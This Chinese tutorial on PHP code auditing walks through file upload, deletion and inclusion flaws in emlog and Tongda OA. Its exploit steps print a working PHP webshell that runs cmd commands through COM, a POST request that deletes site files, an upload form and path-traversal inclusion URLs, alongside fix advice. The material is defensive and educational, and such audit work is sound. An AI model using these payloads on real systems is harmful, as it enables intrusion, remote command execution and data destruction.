@@ -1,0 +1,184 @@
+引言
+
+在Web应用安全领域，文件操作类漏洞（如文件上传、下载、删除、包含）一直是高危且频繁出现的问题。PHP作为广泛使用的后端语言，其原生文件操作函数（如move_uploaded_file、unlink、include等）若未经过严格过滤，极易被攻击者利用，进而获取服务器权限或窃取敏感数据。本文将从代码审计的角度，系统阐述文件操作漏洞的挖掘思路，并结合emlog和通达OA的真实漏洞案例，展示从理论到实践的完整分析过程。
+
+一、文件操作漏洞的审计方法论
+
+1.1 快速分析脆弱点
+
+在审计PHP代码时，针对文件操作功能，可遵循以下三个步骤快速定位潜在风险：
+
+· 看文件路径：关注文件操作的参数是否包含路径信息（如$filepath），能否通过../跨目录跳转。
+· 看代码里面的变量（可控）：判断变量是否来源于用户输入（如$_GET、$_POST、$_FILES、$_COOKIE等），是否可被控制。
+· 看变量前后的过滤：检查变量在使用前是否有过滤函数（如basename、realpath、addslashes等）或路径拼接是否安全。
+
+1.2 文件安全挖掘点
+
+根据功能特点，可以围绕以下关键字或场景进行搜索：
+
+· 脚本文件名：如upload.php、download.php、delete.php、include.php。
+· 应用功能点：如模板安装、插件上传、附件管理、数据库备份恢复等。
+· 操作关键字：在代码中搜索$_FILES（文件上传）、file_get_contents（文件读取）、unlink（文件删除）、include/require（文件包含）、move_uploaded_file等函数。
+
+接下来，我们将通过两个实际案例，深入剖析文件操作漏洞的发现与利用过程。
+
+二、案例一：emlog 文件上传与删除漏洞
+
+emlog是一款轻量级的博客系统，其文件上传和删除功能曾被发现存在严重漏洞（CNVD-2023-74536、CNVD-2023-74535、CNVD-2021-41633）。以下是对这两个漏洞的详细分析。
+
+2.1 文件上传漏洞（模板/插件上传点）
+
+漏洞定位
+
+审计者通过搜索$_FILES关键字，发现/admin/template.php和/admin/plugin.php中存在上传ZIP压缩包的功能。关键函数为upload_zip，该函数调用了emUnZip进行解压。
+
+```php
+// template.php 片段
+if ($action == 'upload_zip') {
+    $zipfile = $_FILES['zip']['tmp_name'];
+    emUnZip($zipfile, '../content/templates/');
+}
+```
+
+emUnZip函数负责将ZIP文件解压到指定目录，且未对压缩包内的文件路径进行严格检查。攻击者可以构造一个包含恶意PHP文件的ZIP包，其中文件路径可能使用../跳出模板目录。
+
+漏洞利用
+
+1. 压缩恶意模板：创建一个名为shell.php的恶意文件，内容为一句话木马。使用压缩工具将其打包成malicious.zip，并确保压缩包内文件路径为../shell.php（利用目录穿越）。
+2. 上传压缩包：访问/admin/template.php?action=upload_zip，上传malicious.zip。
+3. 触发解压：服务器调用emUnZip，将文件解压到../content/templates/，但由于路径穿越，shell.php最终被写入Web根目录或任意可访问目录。
+4. 连接后门：访问http://target/shell.php，获得代码执行权限。
+
+修复建议
+
+对解压操作应使用安全的函数（如ZipArchive的extractTo并检查每个文件的实际路径），避免../导致的目录穿越。
+
+2.2 文件删除漏洞（备份删除点）
+
+漏洞定位
+
+通过搜索unlink函数，发现/admin/data.php中存在action=dell_all_bak的操作，该操作用于批量删除备份文件。
+
+```php
+// data.php 片段
+if ($action == 'dell_all_bak') {
+    $bak = $_POST['bak'];
+    foreach ($bak as $val) {
+        unlink($val);
+    }
+}
+```
+
+代码直接从POST参数bak[]获取文件路径并调用unlink删除，没有任何过滤或路径检查。攻击者可以提交../路径删除任意文件。
+
+漏洞利用
+
+1. 构造POST请求：
+   ```
+   POST /admin/data.php?action=dell_all_bak HTTP/1.1
+   Host: target
+   Content-Type: application/x-www-form-urlencoded
+   
+   bak[]=../config.php&bak[]=../index.php
+   ```
+2. 服务器将删除config.php和index.php，导致网站瘫痪或进一步利用（如删除安装锁文件重装系统）。
+
+修复建议
+
+删除操作前应使用realpath获取绝对路径，并判断路径是否在允许的目录范围内。
+
+三、案例二：通达OA 文件上传与文件包含漏洞
+
+通达OA是一款流行的协同办公系统，其部分版本源码经过加密，但仍可通过黑盒测试或历史资料发现漏洞。以下是其文件上传与文件包含的组合利用。
+
+3.1 文件上传漏洞（/ispirit/im/upload.php）
+
+漏洞分析
+
+通达OA的即时通讯组件存在上传点/ispirit/im/upload.php。审计发现，上传逻辑依赖三个关键参数：
+
+· P：必须非0，用于绕过某些验证。
+· UPLOAD_MODE：值为1、2或3，决定上传模式。
+· DEST_UID：目标用户ID，设为1（管理员）即可。
+· 文件参数名：ATTACHMENT。
+
+代码未对上传文件类型进行严格校验，仅通过扩展名白名单过滤，但可通过修改文件头等方式绕过。
+
+漏洞利用
+
+构造一个包含恶意文件上传的HTML表单：
+
+```html
+<html>
+<body>
+<form action="http://127.0.0.1/ispirit/im/upload.php" method="post" enctype="multipart/form-data">
+    <input type="text" name="P" value="1">
+    <input type="text" name="UPLOAD_MODE" value="1">
+    <input type="text" name="DEST_UID" value="1">
+    <input type="file" name="ATTACHMENT">
+    <input type="submit">
+</form>
+</body>
+</html>
+```
+
+选择包含恶意代码的.txt文件（如写入PHP代码），上传后服务器会将其保存在/attach/im/目录下，文件名格式为时间戳.序号.txt（如1600449966.1.txt）。
+
+3.2 文件包含漏洞（/ispirit/interface/gateway.php）
+
+漏洞分析
+
+文件/ispirit/interface/gateway.php中存在一处include_once调用，其文件路径由参数url提供。
+
+```php
+// gateway.php 片段
+$json = $_GET['json'];
+$url = $_GET['url'];
+// ... 一些处理
+include_once($url);
+```
+
+参数url未经过滤，直接用于包含文件。攻击者可以包含之前上传的文本文件，由于PHP引擎会执行文件中的PHP代码，因此可实现任意命令执行。
+
+漏洞利用
+
+1. 首先通过上传点上传一个包含PHP代码的文本文件，例如内容为：
+   ```php
+   <?php $command=$_POST['cmd']; $wsh = new COM('WScript.shell'); $exec = $wsh->exec("cmd /c ".$command); $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?>
+   ```
+   上传后得到路径/attach/im/2310/1600449966.1.txt。
+2. 构造包含请求，利用目录穿越包含该文件：
+   ```
+   /ispirit/interface/gateway.php?json={}&url=/general/../../attach/im/2310/1600449966.1.txt
+   ```
+   或
+   ```
+   /ispirit/interface/gateway.php?json={}&url=/ispirit/../../attach/im/2310/1600449966.1.txt
+   ```
+   或
+   ```
+   /ispirit/interface/gateway.php?json={}&url=/module/../../attach/im/2310/1600449966.1.txt
+   ```
+3. 在POST数据中发送cmd=whoami，即可获得命令执行结果。
+
+修复建议
+
+· 上传点应严格校验文件内容，禁止上传包含脚本代码的文件。
+· 包含点应对参数进行白名单限制，或使用realpath确保文件在允许目录内。
+
+四、总结与启示
+
+通过以上两个案例，我们可以看到文件操作类漏洞在PHP应用中的普遍性与危害性。攻击者往往通过搜索文件操作相关的函数名或参数名，快速定位潜在风险点。在审计过程中，应始终关注变量的可控性以及过滤的严密性。
+
+对于开发者而言，以下几点是防范此类漏洞的关键：
+
+· 输入验证：所有用户输入（包括文件名、路径）都应被视为不可信，进行严格的校验或白名单过滤。
+· 路径安全：使用basename、realpath等函数处理文件路径，防止目录穿越。
+· 最小权限：文件上传目录应禁止脚本执行，或单独设置为静态资源目录。
+· 函数审计：对unlink、include、file_put_contents等敏感函数进行调用审计，确保参数不可控。
+
+代码审计不仅是发现漏洞的手段，更是提升应用安全质量的重要环节。希望本文的分析思路能帮助安全从业者更高效地挖掘和修复文件操作类漏洞，共同构建更安全的Web环境。
+
+---
+
+文章所涉及漏洞均已修复，相关CNVD编号可查阅公开信息。测试环境请遵守法律法规，勿用于非法用途。
